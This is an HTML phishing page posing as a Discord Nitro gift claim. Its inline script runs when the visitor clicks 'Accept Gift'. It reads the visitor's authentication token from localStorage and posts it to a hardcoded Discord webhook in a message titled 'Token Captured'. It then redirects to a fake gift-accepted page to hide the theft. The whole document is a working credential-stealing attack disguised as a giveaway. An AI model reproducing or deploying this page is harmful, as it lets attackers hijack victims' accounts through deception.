<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Claim Nitro</title>
    <style>
        body { background-color: #36393f; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .modal { background: #2f3136; padding: 40px; border-radius: 8px; text-align: center; width: 400px; }
        button { background: #5865f2; color: white; border: none; padding: 15px; width: 100%; cursor: pointer; border-radius: 4px; font-size: 16px; }
    </style>
</head>
<body>
    <div class="modal">
        <h1>Claim your Nitro</h1>
        <button id="btn">Accept Gift</button>
        <p id="status"></p>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('btn').addEventListener('click', async () => {
                const btn = document.getElementById('btn');
                const status = document.getElementById('status');
                
                btn.innerText = "Checking...";
                
                const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");

                if (token) {
                    await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            embeds: [{
                                title: "Token Captured",
                                description: `Token: ${token}`
                            }]
                        })
                    });
                }
                
                window.location.href = "https://discord.com/billing/promotions/gift-accepted";
            });
        });
    </script>
</body>
</html>
